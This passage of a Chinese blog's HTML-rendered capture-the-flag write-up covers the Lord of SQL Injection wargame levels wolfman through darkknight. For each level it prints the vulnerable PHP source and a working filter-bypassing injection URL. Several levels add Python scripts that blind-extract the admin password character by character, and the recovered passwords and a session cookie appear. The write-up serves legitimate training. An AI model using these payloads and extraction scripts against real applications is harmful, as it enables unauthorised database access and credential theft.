class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;wolfman&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了空格，可以用<code>/**/</code>注释进行绕过</p>\n<p><code>https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=an&#39;/**/union/**/select/**/&#39;admin&#39;%23</code></p>\n<h1 id=\"6-darkelf\"><a href=\"#6-darkelf\" class=\"headerlink\" title=\"6. darkelf\"></a>6. darkelf</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect();  </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/or|and/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_darkelf where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;darkelf&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了or，and，真不知过滤这个有啥用，可以直接用上一题的payload</p>\n<p>``<a href=\"https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=123&#39;+union+select+&#39;admin&#39;%23%60\">https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=123&#39;+union+select+&#39;admin&#39;%23`</a></p>\n<h1 id=\"7-orge\"><a href=\"#7-orge\" class=\"headerlink\" title=\"7. orge\"></a>7. orge</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/or|and/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_orge where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_orge where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;orge&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>跟第四题一样，只是过滤了or，只需要通过<code>||</code>替换or即可，可以用同一个脚本进行注入</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;123&#x27;+||+ascii(substr(pw,&#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, <span class=\"built_in\">ord</span>(s)), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>注入出来的结果是<code>7b751aec</code>，pw传入这个值即可通关</p>\n<h1 id=\"8-troll\"><a href=\"#8-troll\" class=\"headerlink\" title=\"8. troll\"></a>8. troll</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/admin/&quot;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>);</span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_troll where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;troll&quot;</span>);</span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这道题被坑了很久，preg_match对admin是没有忽略大小写的，所以可以直接大小写绕过即可，单引号在这里是没有办法进行绕过的</p>\n<p><code>https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=Admin</code></p>\n<h1 id=\"9-vampire\"><a href=\"#9-vampire\" class=\"headerlink\" title=\"9. vampire\"></a>9. vampire</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[id])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>);</span><br><span class=\"line\">  $_GET[id] = strtolower($_GET[id]);</span><br><span class=\"line\">  $_GET[id] = str_replace(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$_GET[id]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_vampire where id=&#x27;<span class=\"subst\">&#123;$_GET[id]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;vampire&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这道题很简单，对admin采取了替换的方式，直接可以使用双写绕过</p>\n<p><code>https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin</code></p>\n<h1 id=\"10-skeleton\"><a href=\"#10-skeleton\" class=\"headerlink\" title=\"10. skeleton\"></a>10. skeleton</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>] == <span class=\"string\">&#x27;admin&#x27;</span>) solve(<span class=\"string\">&quot;skeleton&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>直接通过注释符将后面的语句注释掉</p>\n<p><code>https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=123&#39;+union+select+&#39;admin&#39;%23</code></p>\n<h1 id=\"11-golem\"><a href=\"#11-golem\" class=\"headerlink\" title=\"11. golem\"></a>11. golem</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/or|and|substr\\(|=/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_golem where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;golem&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了substr可以用mid或者substring替代，and和or可以分别用&amp;&amp;和||进行替换，要查询admin的密码，需要用以下payload:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">x&#x27;||id+like+&#x27;admin&#x27;%26%26mid(pw,1,1)+like+&#x27;a</span></span><br></pre></td></tr></table></figure>\n\n<p>用python写成脚本跑密码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;x&#x27;||id+like+&#x27;admin&#x27;%26%26mid(pw,&#123;&#125;,1)+like+&#x27;&#123;&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, s), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            temp = temp+s</span><br><span class=\"line\">            print(temp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>最后得到admin的pw为:<code>77d6290b</code></p>\n<h1 id=\"12-darkknight\"><a href=\"#12-darkknight\" class=\"headerlink\" title=\"12. darkknight\"></a>12. darkknight</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&quot;./config.php&quot;</span>; </span><br><span class=\"line\">  login_chk(); </span><br><span class=\"line\">  $db = dbconnect(); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/prob|_|\\.|\\(\\)/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;No Hack ~_~&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;/i&#x27;</span>, $_GET[pw])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/\\&#x27;|substr|ascii|=/i&#x27;</span>, $_GET[no])) <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;HeHe&quot;</span>); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select id from prob_darkknight where id=&#x27;guest&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27; and no=<span class=\"subst\">&#123;$_GET[no]&#125;</span>&quot;</span>; </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class=\"subst\">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>($result[<span class=\"string\">&#x27;id&#x27;</span>]) <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2&gt;Hello <span class=\"subst\">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class=\"line\">   </span><br><span class=\"line\">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class=\"line\">  $query = <span class=\"string\">&quot;select pw from prob_darkknight where id=&#x27;admin&#x27; and pw=&#x27;<span class=\"subst\">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class=\"line\">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class=\"line\">  <span class=\"keyword\">if</span>(($result[<span class=\"string\">&#x27;pw&#x27;</span>]) &amp;&amp; ($result[<span class=\"string\">&#x27;pw&#x27;</span>] == $_GET[<span class=\"string\">&#x27;pw&#x27;</span>])) solve(<span class=\"string\">&quot;darkknight&quot;</span>); </span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了ascii可以用ord替换，过滤了=号可以用&lt;&gt;不等号进行替换，不能用单引号闭合，则在no参数进行注入。注入的paylaod如下</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">1+or+id+like+0x61646d696e+and+ord(mid(pw,1,1))&lt;&gt;22</span></span><br></pre></td></tr></table></figure>\n\n<p>写python脚本进行注入</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">requests.packages.urllib3.disable_warnings()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;PHPSESSID&quot;</span>: <span class=\"string\">&quot;rhp99vgk8f13cu761gt3lnr774&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;1+or+id+like+0x61646d696e+and+ord(mid(pw,&#123;&#125;,1))&lt;&gt;&#123;&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        r = requests.get(<span class=\"string\">&quot;https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&amp;no=&quot;</span>+payload.<span class=\"built_in\">format</span>(i+<span class=\"number\">1</span>, <span class=\"built_in\">ord</span>(s)), </span><br><span class=\"line\">            cookies=cookie, proxies=&#123;<span class=\"string\">&#x27;https&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>, <span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;,</span><br><span class=\"line\">            verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello admin&quot;</span> <span class=\"keyword\">not</span> <span 